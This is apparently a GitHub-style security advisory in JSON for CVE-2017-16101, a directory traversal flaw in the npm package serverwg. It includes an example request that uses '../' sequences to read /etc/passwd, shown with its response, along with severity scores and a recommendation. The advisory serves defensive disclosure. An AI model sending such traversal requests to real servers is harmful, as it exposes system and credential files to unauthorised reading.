{
    "Title": "Directory Traversal in serverwg",
    "Meta": {
        "Package": [
            "serverwg([npm](/advisories?query=ecosystem%3Anpm))"
        ],
        "Affected versions": [
            ">= 0.0.0"
        ],
        "Patched versions": [
            "None"
        ]
    },
    "Description": "`serverwg` is a simple http server.\n\n`serverwg` is vulnerable to a directory traversal issue, giving an attacker\naccess to the filesystem by placing \"../\" in the URL.\n\n**Example request:**\n\n    \n    \n    GET /../../../../../../../../../../etc/passwd HTTP/1.1\n    host:foo\n\nand response:\n\n    \n    \n    HTTP/1.1 200 OK\n    Date: Wed, 17 May 2017 22:52:08 GMT\n    Connection: keep-alive\n    \n    {contents of /etc/passwd}\n    \n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if\nthe functionality is needed for production, a different package is used\ninstead.\n\n### References\n\n  * <https://github.com/JacksonGL/NPM-Vuln-PoC/tree/master/directory-traversal/serverwg>\n  * <https://www.npmjs.com/advisories/364>\n  * <https://nvd.nist.gov/vuln/detail/CVE-2017-16101>\n\n",
    "Severity": {
        "Score": "7.5/ 10 (High)",
        "CVSS base metrics": {
            "Attack vector": "Network",
            "Attack complexity": "Low",
            "Privileges required": "None",
            "User interaction": "None",
            "Scope": "Unchanged",
            "Confidentiality": "High",
            "Integrity": "None",
            "Availability": "None"
        },
        "CVSS string": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    },
    "Weaknesses": [
        "[CWE-22](/advisories?query=cwe%3A22)"
    ],
    "CVE ID": "CVE-2017-16101",
    "GHSA ID": "GHSA-2f29-pmpx-vj62",
    "Source code": "No known source code"
}